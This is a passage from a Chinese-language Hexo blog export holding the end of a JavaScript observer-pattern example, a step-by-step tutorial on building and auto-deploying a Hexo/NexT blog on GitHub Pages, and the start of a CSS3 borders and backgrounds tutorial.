<p>选择paper的公关部门需要读取读者的tweet,并且订阅joe的信息，那么需要提供方法readTweets():<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">paper.readTweets = <span class="function"><span class="keyword">function</span> (<span class="params">tweet</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Call big meeting! Someone '</span> + tweet);</span><br><span class="line">&#125;;</span><br><span class="line">joe.subscribe(paper.readTweets);</span><br></pre></td></tr></table></figure></p>
<p>执行<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">joe.tweet(<span class="string">'hated the paper today'</span>);</span><br></pre></td></tr></table></figure></p>
<p>打印<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Call big meeting! Someone hated the paper today</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>使用hexo和github搭建个人博客网站</title>
    <url>/2019/10/04/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<p>使用hexo+github可以免费、快速地搭建一个静态博客网站，并且使用hexo提供的命令以及git自身的功能可以很便捷地管理博客。<br><a id="more"></a></p>
<h1 id="使用github部署静态页面"><a href="#使用github部署静态页面" class="headerlink" title="使用github部署静态页面"></a>使用github部署静态页面</h1><p>在了解hexo之前，我们先看看如何使用github部署静态页面。</p>
<h2 id="注册github账号"><a href="#注册github账号" class="headerlink" title="注册github账号"></a>注册github账号</h2><p>访问<a href="https://github.com/" target="_blank" rel="noopener">github官网</a>注册一个账号，该流程和一般网站注册账号一样，在此不赘述。</p>
<h2 id="创建一个git仓库"><a href="#创建一个git仓库" class="headerlink" title="创建一个git仓库"></a>创建一个git仓库</h2><p><img src="https://mfaying.github.io/static/images/hexo+github/1.jpg" alt="avatar"></p>
<p>其他项如果需要可以自主填写，这里只填写仓库名，点击Create repository创建仓库。<br><img src="https://mfaying.github.io/static/images/hexo+github/2.jpg" alt="avatar"></p>
<h2 id="提交一个测试页面"><a href="#提交一个测试页面" class="headerlink" title="提交一个测试页面"></a>提交一个测试页面</h2><p>执行git clone命令将仓库克隆到本地<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:mfaying/hexo-test.git</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/hexo+github/3.jpg" alt="avatar"></p>
<p>向hexo-test仓库提交一个测试的html页面，命名为index.html，内容如下：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>hexo test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  hexo test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>提交并推到远端<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &apos;add index.html&apos;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p>
<p>提交成功以后，hexo-test仓库的内容变成了<br><img src="https://mfaying.github.io/static/images/hexo+github/4.jpg" alt="avatar"></p>
<h2 id="setting设置"><a href="#setting设置" class="headerlink" title="setting设置"></a>setting设置</h2><p>点击setting设置<br><img src="https://mfaying.github.io/static/images/hexo+github/5.jpg" alt="avatar"></p>
<p>找到GitHub Pages，点击Choose a theme<br><img src="https://mfaying.github.io/static/images/hexo+github/6.jpg" alt="avatar"></p>
<p>直接点击Select theme<br><img src="https://mfaying.github.io/static/images/hexo+github/7.jpg" alt="avatar"></p>
<p>此时你会发现GitHub Pages发生了变化，<code>Your site is ready to be published at https://mfaying.github.io/hexo-test/</code>说明你的静态网站已经建成了。<br><img src="https://mfaying.github.io/static/images/hexo+github/8.jpg" alt="avatar"></p>
<p>直接点击<a href="https://mfaying.github.io/hexo-test/" target="_blank" rel="noopener">https://mfaying.github.io/hexo-test/</a> 访问便会出现如下内容，静态服务器默认会访问index.html文件。<br><img src="https://mfaying.github.io/static/images/hexo+github/9.jpg" alt="avatar"></p>
<p>至此，我们成功地使用github搭建了一个静态网站。当然啦，这个网站几乎没有什么内容，所以接下来我们将使用hexo搭建一个功能完备的博客网站，但是部署方法就是这里介绍的github的静态服务器功能。</p>
<h1 id="使用hexo搭建博客网站"><a href="#使用hexo搭建博客网站" class="headerlink" title="使用hexo搭建博客网站"></a>使用hexo搭建博客网站</h1><h2 id="全局安装hexo-cli"><a href="#全局安装hexo-cli" class="headerlink" title="全局安装hexo-cli"></a>全局安装hexo-cli</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<p>npm安装速度较慢，可以切换到国内的<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝NPM镜像</a>，使用cnpm命令代替npm命令安装。</p>
<p>安装完成后执行hexo -v检查安装是否完成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br><span class="line"></span><br><span class="line">hexo-cli: 1.1.0</span><br><span class="line">os: Darwin 18.2.0 darwin x64</span><br><span class="line">http_parser: 2.8.0</span><br><span class="line">node: 10.15.3</span><br><span class="line">v8: 6.8.275.32-node.51</span><br><span class="line">uv: 1.23.2</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">ares: 1.15.0</span><br><span class="line">modules: 64</span><br><span class="line">nghttp2: 1.34.0</span><br><span class="line">napi: 3</span><br><span class="line">openssl: 1.1.0j</span><br><span class="line">icu: 62.1</span><br><span class="line">unicode: 11.0</span><br><span class="line">cldr: 33.1</span><br><span class="line">tz: 2018e</span><br></pre></td></tr></table></figure></p>
<h2 id="初始化博客工程"><a href="#初始化博客工程" class="headerlink" title="初始化博客工程"></a>初始化博客工程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br></pre></td></tr></table></figure>
<h2 id="安装NexT主题"><a href="#安装NexT主题" class="headerlink" title="安装NexT主题"></a>安装NexT主题</h2><p>我们这里选取了NexT主题替换默认的landscape主题，当然你完全可以使用默认的landscape主题，或者根据自己的喜好选择其他主题。安装主题的方式非常简单，只需要将主题文件克隆至工程目录的 themes目录下， 然后修改下配置文件_config.yml即可。</p>
<p>在工程目录下克隆最新版本的next主题<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></p>
<p>修改根目录下_config.yml配置文件，找到theme字段，将landscape改为next。<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br></pre></td></tr></table></figure></p>
<p>修改为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure></p>
<p>执行hexo server，启动本地服务器。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure></p>
<p>访问网址<a href="http://localhost:4000/便可以看到使用next主题的博客网站的样子了。" target="_blank" rel="noopener">http://localhost:4000/便可以看到使用next主题的博客网站的样子了。</a><br><img src="https://mfaying.github.io/static/images/hexo+github/10.jpg" alt="avatar"></p>
<h2 id="将本地hexo工程连接到git远端仓库"><a href="#将本地hexo工程连接到git远端仓库" class="headerlink" title="将本地hexo工程连接到git远端仓库"></a>将本地hexo工程连接到git远端仓库</h2><p>我们用前面建立的hexo-test和blog两个工程做演示。其中本地hexo为blog目录，hexo-test为git远端仓库，我们需要将本地blog目录里的文件提交到远端的hexo-test仓库。</p>
<p>首先，我们之前提交的index.html文件，我们不再需要了，先删除它。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> hexo-test</span><br><span class="line">rm -rf index.html</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">'remove index.html'</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p>
<p>blog目录git初始化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line">git init</span><br></pre></td></tr></table></figure></p>
<p>此时我们看到next目录无法直接提交，这是因为next目录是一个子模块(submodule)<br><img src="https://mfaying.github.io/static/images/hexo+github/11.jpg" alt="avatar"><br>我们需要删除next目录下的.git文件，next目录变成一个普通文件夹，这样它就可以直接提交了。<br>进入next目录，执行rm -rf .git命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/next/</span><br><span class="line">rm -rf .git</span><br></pre></td></tr></table></figure></p>
<p>此时next目录就可以直接提交了<br><img src="https://mfaying.github.io/static/images/hexo+github/12.jpg" alt="avatar"><br>执行以下命令就可以将blog目录里的内容提交到远端的hexo-test仓库了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">'init'</span></span><br><span class="line">git remote add origin git@github.com:mfaying/hexo-test.git</span><br><span class="line">git push -f origin master</span><br></pre></td></tr></table></figure></p>
<p>注意，这里我的本地电脑和远端的git已经配置过ssh了，所以提交的时候不会出现权限问题。如果你连接的是自己的远端仓库，可以查找下如何进行git的ssh配置。</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>部署我们需要建一个前面提到的开通GitHub Pages功能的工程，这个专门放置部署的静态文件，我们将该工程命名为hexo-test-deploy(若是发布到hexo-test工程上远端的源代码会被部署的静态文件覆盖掉)。这时hexo-test其实就不需要开通GitHub Pages功能了，而且hexo-test也可以设置成私有工程以避免源代码被查看。</p>
<p>最后我们需要配置部署路径，修改文件_config.yml的deploy字段如下：<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:mfaying/hexo-test-deploy.git</span> <span class="comment">#你的GitHub Pages的仓库地址</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></p>
<p>我们需要先安装hexo-deployer-git依赖包才能执行hexo deploy命令部署网站<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p>
<p>执行以下命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean <span class="comment"># 简写hexo c，清除缓存文件(db.json)和已生成的静态文件(public)</span></span><br><span class="line">hexo generate <span class="comment"># 简写hexo g，生成静态文件</span></span><br><span class="line">hexo deploy <span class="comment"># 简写hexo d，部署</span></span><br></pre></td></tr></table></figure></p>
<p>其中hexo g和hexo d可以合并写成hexo d -g<br>现在我们访问之前的链接 <a href="https://mfaying.github.io/hexo-test-deploy/，一个静态博客网站生成了！" target="_blank" rel="noopener">https://mfaying.github.io/hexo-test-deploy/，一个静态博客网站生成了！</a><br><img src="https://mfaying.github.io/static/images/hexo+github/13.jpg" alt="avatar"></p>
<p>至此，我们其实已经完成静态博客网站的建设，后续我们将介绍一些功能和方法，使网站功能更加完备。</p>
<h1 id="博客网站功能完善"><a href="#博客网站功能完善" class="headerlink" title="博客网站功能完善"></a>博客网站功能完善</h1><p>这节我们只会介绍几个完善网站功能的方法，如果你还想增加其他功能，可以通读<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT 使用文档</a>、<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">文档|hexo</a>，根据自己的需要来增加功能。</p>
<h2 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h2><p>修改站点配置文件(_config.yml)的language字段，比如设置为简体中文<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure></p>
<p>此时页面变为<br><img src="https://mfaying.github.io/static/images/hexo+github/14.jpg" alt="avatar"></p>
<h2 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h2><p>修改主题配置文件(/themes/next/_config.yml)的menu字段<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span></span><br><span class="line">  <span class="comment">#about: /about/ || user</span></span><br><span class="line">  <span class="comment">#tags: /tags/ || tags</span></span><br><span class="line">  <span class="comment">#categories: /categories/ || th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure></p>
<p>修改为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span></span><br><span class="line">  <span class="comment">#about: /about/ || user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure></p>
<p>创建tags页面<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">"tags"</span></span><br></pre></td></tr></table></figure></p>
<p>编辑/source/tags/index.md文件为<br><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2019-10-05 16:02:39</span><br><span class="line">type: "tags"</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<p>创建categories页面<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">"categories"</span></span><br></pre></td></tr></table></figure></p>
<p>编辑/source/categories/index.md文件为<br><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2019-10-05 15:59:54</span><br><span class="line">type: "categories"</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
<p>配置根路径为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://mfaying.github.io/hexo-test-deploy</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/hexo-test-deploy/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure></p>
<p>访问页面如下<br><img src="https://mfaying.github.io/static/images/hexo+github/15.jpg" alt="avatar"></p>
<h2 id="创建一篇文章"><a href="#创建一篇文章" class="headerlink" title="创建一篇文章"></a>创建一篇文章</h2><p>执行命令创建一篇文章<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">'测试文章'</span></span><br></pre></td></tr></table></figure></p>
<p>我们发现在source/_posts/目录下生成了测试文章.md，编辑内容如下<br><figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章测试</span><br><span class="line">date: 2019-10-05 16:20:04</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">    - </span>hexo</span><br><span class="line">categories: 其他</span><br><span class="line">---</span><br><span class="line">这是摘要</span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- more --&gt;</span></span></span><br><span class="line">以下是正文</span><br><span class="line"><span class="section"># 标题1</span></span><br><span class="line">1</span><br><span class="line"><span class="section">## 标题2</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure></p>
<p>部署后可以发现一篇文章创建成功了。<br><img src="https://mfaying.github.io/static/images/hexo+github/16.jpg" alt="avatar"></p>
<h2 id="push时自动部署"><a href="#push时自动部署" class="headerlink" title="push时自动部署"></a>push时自动部署</h2><p>我们借助git的钩子实现在本地代码推送到远端时自动部署网站。</p>
<p>首先安装husky开发环境依赖包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install husky --save-dev</span><br></pre></td></tr></table></figure></p>
<p>修改根目录package.json文件如下<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"scripts": &#123;</span><br><span class="line">  "publish": "hexo clean &amp;&amp; hexo d -g"</span><br><span class="line">&#125;,</span><br><span class="line">"husky": &#123;</span><br><span class="line">  "hooks": &#123;</span><br><span class="line">    "pre-push": "npm run publish"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>此时执行命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">'自动部署'</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p>
<p>我们会发现在代码提交时，自动执行了<code>hexo clean &amp;&amp; hexo d -g</code>部署命令。</p>
<p>至此，我们使用hexo和github搭建静态博客网站的内容已经介绍完毕了，hexo其实还有很多相当多的功能可以使用，比如阅读人数统计、评论功能等等，你还可以根据自己的想法去修改源码完善自己的博客。</p>
<p>参考</p>
<ol>
<li><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">文档|hexo</a></li>
<li><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a></li>
<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT 使用文档</a></li>
</ol>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>css3教程</title>
    <url>/2019/10/07/css3%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="CSS3-简介"><a href="#CSS3-简介" class="headerlink" title="CSS3 简介"></a>CSS3 简介</h1><p>CSS3 完全向后兼容，因此您不必改变现有的设计。浏览器通常支持 CSS2。</p>
<h2 id="CSS3-模块"><a href="#CSS3-模块" class="headerlink" title="CSS3 模块"></a>CSS3 模块</h2><p>CSS3 被划分为模块。</p>
<p>其中最重要的 CSS3 模块包括：</p>
<ol>
<li>选择器</li>
<li>框模型</li>
<li>背景和边框</li>
<li>文本效果</li>
<li>2D/3D 转换</li>
<li>动画</li>
<li>多列布局</li>
<li>用户界面</li>
</ol>
<a id="more"></a>
<h1 id="CSS3-边框"><a href="#CSS3-边框" class="headerlink" title="CSS3 边框"></a>CSS3 边框</h1><p>通过 CSS3，您能够创建圆角边框，向矩形添加阴影，使用图片来绘制边框</p>
<p>下面您将学到以下边框属性：</p>
<ol>
<li>border-radius</li>
<li>box-shadow</li>
<li>border-image</li>
</ol>
<h2 id="CSS3-圆角边框"><a href="#CSS3-圆角边框" class="headerlink" title="CSS3 圆角边框"></a>CSS3 圆角边框</h2><p>在 CSS3 中，border-radius 属性用于创建圆角：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">2px</span> solid;</span><br><span class="line">  <span class="attribute">border-radius</span>:<span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">-moz-border-radius</span>:<span class="number">25px</span>; <span class="comment">/* Old Firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>属性是一个简写属性，用于设置四个 border-*-radius 属性。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">border-radius: 1-4 length|% / 1-4 length|%;</span><br></pre></td></tr></table></figure></p>
<p>按此顺序设置每个 radii 的四个值。如果省略 bottom-left，则与 top-right 相同。如果省略 bottom-right，则与 top-left 相同。如果省略 top-right，则与 top-left 相同。<br>值</p>
<ol>
<li>length    定义圆角的形状。</li>
<li>%    以百分比定义圆角的形状。<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">border-radius</span><span class="selector-pseudo">:2em</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>等价于：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">border-top-left-radius</span><span class="selector-pseudo">:2em</span>;</span><br><span class="line"><span class="selector-tag">border-top-right-radius</span><span class="selector-pseudo">:2em</span>;</span><br><span class="line"><span class="selector-tag">border-bottom-right-radius</span><span class="selector-pseudo">:2em</span>;</span><br><span class="line"><span class="selector-tag">border-bottom-left-radius</span><span class="selector-pseudo">:2em</span>;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">border-radius: 2em 1em 4em / 0.5em 3em;</span><br></pre></td></tr></table></figure>
<p>等价于<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">border-top-left-radius</span>: 2<span class="selector-tag">em</span> 0<span class="selector-class">.5em</span>;</span><br><span class="line"><span class="selector-tag">border-top-right-radius</span>: 1<span class="selector-tag">em</span> 3<span class="selector-tag">em</span>;</span><br><span class="line"><span class="selector-tag">border-bottom-right-radius</span>: 4<span class="selector-tag">em</span> 0<span class="selector-class">.5em</span>;</span><br><span class="line"><span class="selector-tag">border-bottom-left-radius</span>: 1<span class="selector-tag">em</span> 3<span class="selector-tag">em</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="CSS3-边框阴影"><a href="#CSS3-边框阴影" class="headerlink" title="CSS3 边框阴影"></a>CSS3 边框阴影</h2><p>在 CSS3 中，box-shadow 用于向方框添加阴影：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">10px</span> <span class="number">5px</span> <span class="number">#888888</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>语法<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">box-shadow</span>: <span class="selector-tag">h-shadow</span> <span class="selector-tag">v-shadow</span> <span class="selector-tag">blur</span> <span class="selector-tag">spread</span> <span class="selector-tag">color</span> <span class="selector-tag">inset</span>;</span><br></pre></td></tr></table></figure></p>
<p>box-shadow 向框添加一个或多个阴影。该属性是由逗号分隔的阴影列表，每个阴影由 2-4 个长度值、可选的颜色值以及可选的 inset 关键词来规定。省略长度的值是 0。</p>
<ol>
<li>h-shadow    必需。水平阴影的位置。允许负值。</li>
<li>v-shadow    必需。垂直阴影的位置。允许负值。</li>
<li>blur    可选。模糊距离。</li>
<li>spread    可选。阴影的尺寸。</li>
<li>color    可选。阴影的颜色。请参阅 CSS 颜色值。</li>
<li>inset    可选。将外部阴影 (outset) 改为内部阴影。</li>
</ol>
<h2 id="CSS3-边框图片"><a href="#CSS3-边框图片" class="headerlink" title="CSS3 边框图片"></a>CSS3 边框图片</h2><p>通过 CSS3 的 border-image 属性，您可以使用图片来创建边框：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border-image</span>:<span class="built_in">url</span>(border.png) <span class="number">30</span> <span class="number">30</span> round;</span><br><span class="line">  <span class="attribute">-moz-border-image</span>:<span class="built_in">url</span>(border.png) <span class="number">30</span> <span class="number">30</span> round; <span class="comment">/* 老的 Firefox */</span></span><br><span class="line">  <span class="attribute">-webkit-border-image</span>:<span class="built_in">url</span>(border.png) <span class="number">30</span> <span class="number">30</span> round; <span class="comment">/* Safari 和 Chrome */</span></span><br><span class="line">  <span class="attribute">-o-border-image</span>:<span class="built_in">url</span>(border.png) <span class="number">30</span> <span class="number">30</span> round; <span class="comment">/* Opera */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>border-image 属性是一个简写属性，用于设置以下属性：</p>
<ol>
<li>border-image-source 用在边框的图片的路径。</li>
<li>border-image-slice 图片边框向内偏移。</li>
<li>border-image-width 图片边框的宽度。</li>
<li>border-image-outset 边框图像区域超出边框的量。</li>
<li>border-image-repeat 图像边框是否应平铺(repeated)、铺满(rounded)或拉伸(stretched)。<br>如果省略值，会设置其默认值。<br>使用 border-image-* 属性来构造漂亮的可伸缩按钮！<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">border-image</span>: none <span class="number">100%</span> <span class="number">1</span> <span class="number">0</span> stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="CSS3-背景"><a href="#CSS3-背景" class="headerlink" title="CSS3 背景"></a>CSS3 背景</h1><p>CSS3 包含多个新的背景属性，它们提供了对背景更强大的控制。<br>您将学到以下背景属性：<br>background-size<br>background-origin<br>您也将学到如何使用多重背景图片。</p>
<h2 id="CSS3-background-size-属性"><a href="#CSS3-background-size-属性" class="headerlink" title="CSS3 background-size 属性"></a>CSS3 background-size 属性</h2><p>background-size 属性规定背景图像的尺寸。</p>
<p>默认值：    auto</p>
<p>语法<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">background-size: length|percentage|cover|contain;</span><br></pre></td></tr></table></figure></p>
<p>值</p>
<ol>
<li>length    </li>
</ol>
<p>设置背景图像的高度和宽度。<br>第一个值设置宽度，第二个值设置高度。<br>如果只设置一个值，则第二个值会被设置为 “auto”。</p>
<ol start="2">
<li><p>percentage<br>以父元素的百分比来设置背景图像的宽度和高度。<br>第一个值设置宽度，第二个值设置高度。<br>如果只设置一个值，则第二个值会被设置为 “auto”。</p>
</li>
<li><p>cover<br>把背景图像扩展至足够大，以使背景图像完全覆盖背景区域。<br>背景图像的某些部分也许无法显示在背景定位区域中。</p>
</li>
<li><p>contain<br>把图像图像扩展至最大尺寸，以使其宽度和高度完全适应内容区域。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">url</span>(bg_flower.gif);</span><br><span class="line">  <span class="attribute">-moz-background-size</span>:<span class="number">63px</span> <span class="number">100px</span>; <span class="comment">/* 老版本的 Firefox */</span></span><br><span class="line">  <span class="attribute">background-size</span>:<span class="number">63px</span> <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>:<span class="built_in">url</span>(bg_flower.gif);</span><br><span class="line">  <span class="attribute">-moz-background-size</span>:<span class="number">40%</span> <span class="number">100%</span>; <span class="comment">/* 老版本的 Firefox */</span></span><br><span class="line">  <span class="attribute">background-size</span>:<span class="number">40%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>:no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CSS3-background-origin-属性"><a href="#CSS3-background-origin-属性" class="headerlink" title="CSS3 background-origin 属性"></a>CSS3 background-origin 属性</h2><p>background-origin 属性规定 background-position 属性相对于什么位置来定位。</p>
<p>注释：如果背景图像的 background-attachment 属性为 “fixed”，则该属性没有效果。</p>
<p>默认值：    padding-box</p>
<ol>
<li>padding-box    背景图像相对于内边距框来定位。    测试</li>
<li>border-box    背景图像相对于边框盒来定位。    测试</li>
